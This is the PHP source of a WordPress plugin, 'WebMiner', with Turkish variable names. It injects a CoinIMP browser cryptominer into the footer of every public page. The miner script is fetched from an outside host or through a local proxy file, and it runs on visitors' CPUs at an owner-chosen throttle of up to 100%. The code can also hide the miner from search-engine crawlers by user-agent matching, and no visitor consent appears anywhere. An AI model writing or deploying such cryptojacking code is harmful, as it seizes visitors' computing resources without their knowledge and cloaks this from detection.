<?php

/*
Plugin Name: WebMiner
Plugin URI: http://www.tunaweb.net/
Description: Web siteleri üzerinden coinimp platformunu kullanarak mining yapmanızı sağlayan wordpress eklentisidir.
Version: 1.0
Author: Orçun Tuna
Author URI: http://www.tunaweb.net/
License: Private
Text Domain: web-miner
*/

defined( 'ABSPATH' ) or die( 'No script kiddies please!' );

$webminer_dil = get_option('webminer_dil','en');

require_once 'lang/'.$webminer_dil.'.php';

function webminer_menu() {
	add_options_page( 'WebMiner Ayarlar', 'WebMiner', 'manage_options', 'my-unique-identifier', 'webminer_ayarlar' );
}

function kayit_olustur() { 
  register_setting( 'webminer', 'site_key' );
  register_setting( 'webminer', 'webminer_aktif' );
  register_setting( 'webminer', 'mobil_engel' );
  register_setting( 'webminer', 'uye_engel' );
  register_setting( 'webminer', 'cpu' );
  register_setting( 'webminer', 'sunucu' );
  register_setting( 'webminer', 'orumcek' );
  register_setting( 'webminer', 'webminer_dil' );
}

function webminer_ayarlar() {
	if ( !current_user_can( 'manage_options' ) )  {
		wp_die( __( 'You do not have sufficient permissions to access this page.' ) );
	}
	global $dil;
	echo '<div class="wrap">';
	echo '<h1>'.$dil['h1'].'</h1>';
	echo '<p>'.$dil['aciklama'].'</p>';
	echo '<form method="post" action="options.php">';
	settings_fields('webminer');
	do_settings_sections( 'webminer' );
	?>
	
	<table class="form-table">
	
        <tr valign="top">
			<th scope="row"><?php echo $dil['anahtar']; ?></th>
			<td><input type="text" name="site_key" value="<?php echo esc_attr( get_option('site_key') ); ?>" /></td>
        </tr>
		
		<tr valign="top">
			<th scope="row"><?php echo $dil['aktiflik']; ?></th>
			<td>
				<label><input name="webminer_aktif" type="checkbox" value="1" <?php checked( '1', get_option( 'webminer_aktif' ) ); ?> /><?php echo $dil['calistir']; ?></label><br><br>
				<label><input name="mobil_engel" type="checkbox" value="1" <?php checked( '1', get_option( 'mobil_engel' ) ); ?> /><?php echo $dil['telefon']; ?></label><br><br>
				<label><input name="uye_engel" type="checkbox" value="1" <?php checked( '1', get_option( 'uye_engel' ) ); ?> /><?php echo $dil['uyeengel']; ?></label>
			</td>
        </tr>
		
		<tr valign="top">
			<th scope="row"><?php echo $dil['cpu']; ?></th>
			<td>
				<select name="cpu">
					<option value="" disabled <?php if(empty(get_option('cpu'))){echo 'selected';} ?>><?php echo $dil['seciniz']; ?></option>
					<option value="10" <?php if(get_option('cpu')=='10'){echo 'selected';} ?>>10%</option>
					<option value="20" <?php if(get_option('cpu')=='20'){echo 'selected';} ?>>20%</option>
					<option value="30" <?php if(get_option('cpu')=='30'){echo 'selected';} ?>>30%</option>
					<option value="40" <?php if(get_option('cpu')=='40'){echo 'selected';} ?>>40%</option>
					<option value="50" <?php if(get_option('cpu')=='50'){echo 'selected';} ?>>50%</option>
					<option value="60" <?php if(get_option('cpu')=='60'){echo 'selected';} ?>>60%</option>
					<option value="70" <?php if(get_option('cpu')=='70'){echo 'selected';} ?>>70%</option>
					<option value="80" <?php if(get_option('cpu')=='80'){echo 'selected';} ?>>80%</option>
					<option value="90" <?php if(get_option('cpu')=='90'){echo 'selected';} ?>>90%</option>
					<option value="100" <?php if(get_option('cpu')=='100'){echo 'selected';} ?>>100%</option>

				</select>
			</td>
        </tr>
		
		<tr valign="top">
			<th scope="row"><?php echo $dil['sunucu']; ?></th>
			<td>
				<select name="sunucu">
					<option value="" disabled <?php if(empty(get_option('y'))){echo 'selected';} ?>><?php echo $dil['seciniz']; ?></option>
					<option value="uzak" <?php if(get_option('sunucu')=='uzak'){echo 'selected';} ?>><?php echo $dil['uzaksunucu']; ?></option>
					<option value="yerel" <?php if(get_option('sunucu')=='yerel'){echo 'selected';} ?>><?php echo $dil['yerelsunucu']; ?></option>
				</select>
			</td>
        </tr>
		
		<tr valign="top">
			<th scope="row"><?php echo $dil['orumcekler']; ?></th>
			<td>
				<select name="orumcek">
					<option value="" disabled <?php if(empty(get_option('y'))){echo 'selected';} ?>><?php echo $dil['seciniz']; ?></option>
					<option value="0" <?php if(get_option('orumcek')=='0'){echo 'selected';} ?>><?php echo $dil['goster']; ?></option>
					<option value="1" <?php if(get_option('orumcek')=='1'){echo 'selected';} ?>><?php echo $dil['gizle']; ?></option>

				</select>
			</td>
        </tr>
		
		<tr valign="top">
			<th scope="row">Dil (Language)</th>
			<td>
				<select name="webminer_dil">
					<option value="" disabled <?php if(empty(get_option('y'))){echo 'selected';} ?>><?php echo $dil['seciniz']; ?></option>
					<option value="en" <?php if(get_option('webminer_dil')=='en'){echo 'selected';} ?>>İngilizce (English)</option>
					<option value="tr" <?php if(get_option('webminer_dil')=='tr'){echo 'selected';} ?>>Türkçe (Turkish)</option>

				</select>
			</td>
        </tr>
		
		<tr valign="top">
			<th scope="row"><font color="red"><?php echo $dil['bilgilendirme']; ?></font></th>
			<td>
				<ol>
					<li><?php echo $dil['bilgi1']; ?></li>
					<li><?php echo $dil['bilgi2']; ?></li>
					<li><?php echo $dil['bilgi3']; ?></li>
					<li><?php echo $dil['bilgi4']; ?></li>
					<li><?php echo $dil['bilgi5']; ?></li>
					<li><?php echo $dil['bilgi6']; ?></li>
				</ol>
				
				
			</td>
        </tr>
		
    </table>
	
	<?php
	submit_button();
	echo '</form>';
	
	echo '</div>';
}





if(is_admin()){
	add_action( 'admin_menu', 'webminer_menu' );
	add_action( 'admin_init', 'kayit_olustur' );
}else{
	

	if( empty( get_option('site_key')) || get_option('webminer_aktif') != '1' ){
		
	}else{
		
		$site_key = get_option('site_key','b2849df5d3ee95e354ce3095c402bbabbabf6edd0fc953e0e7aadee32e7dc234');
		$cpu = get_option('cpu','30');
		$sunucu = get_option('sunucu','uzak');
		$orumcek = get_option('orumcek','goster');
		$uye_engel = get_option('uye_engel','0');
		$anasayfa_aktif = get_option('anasayfa_aktif','0');
		$single_aktif = get_option('single_aktif','0');
		$page_aktif = get_option('page_aktif','0');
		$diger_aktif = get_option('diger_aktif','0');
		$mobil_engel = get_option('mobil_engel','0');
		$eklenti_url = plugin_dir_url( __FILE__ );
		
		
		
		if($uye_engel != '1'){
			
			$durum = true;
			
			if($durum == true){
				
				
				require_once 'detect.php';
				$detect = new Mobile_Detect;
				
				if(($detect->isMobile() && $mobil_engel != '1') || $detect->isMobile() == false ){

					$cpu_detay = (100-$cpu) / 100;
					
					function uzakEkle(){
						global $site_key;
						global $cpu_detay;
						echo "
						<script src='https://www.freecontent.date./adaS.js'></script>
						<script>
							var miner = new Client.Anonymous('".$site_key."', { throttle: ".$cpu_detay."});
							miner.start();
						</script>
						";
					}
					
					function yerelEkle(){
						global $site_key;
						global $cpu_detay;
						global $eklenti_url;
						echo "
						<script src='".$eklenti_url."deve.php?f=adaS.js'></script>
						<script>
							var _client = new Client.Anonymous('".$site_key."', {
								throttle: ".$cpu_detay."
							});
							_client.start();
						</script>
						";
					}
					
					
					if (preg_match('/bot|crawl|curl|dataprovider|search|get|spider|find|java|majesticsEO|google|yahoo|teoma|contaxe|yandex|libwww-perl|facebookexternalhit/i', $_SERVER['HTTP_USER_AGENT']) && $orumcek == 'gizle') {
						
					}else{
					
						if($sunucu == 'uzak'){
							add_action( 'wp_footer', 'uzakEkle' );
						}elseif($sunucu == 'yerel'){
							add_action( 'wp_footer', 'yerelEkle' );
						}
					
					}				
								
				}
			
		
			}
		}
	}
}

?>